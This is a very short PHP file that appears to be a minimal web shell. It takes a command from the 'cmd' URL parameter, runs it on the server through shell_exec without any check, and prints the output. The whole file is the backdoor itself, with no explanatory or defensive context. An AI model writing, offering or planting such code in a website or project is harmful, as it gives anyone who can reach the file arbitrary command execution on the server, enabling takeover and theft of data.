<?php
if (isset($_GET['cmd'])) {
?>
	<pre> <?php print((shell_exec($_GET['cmd']))); ?> </pre>
<?php
}
?>
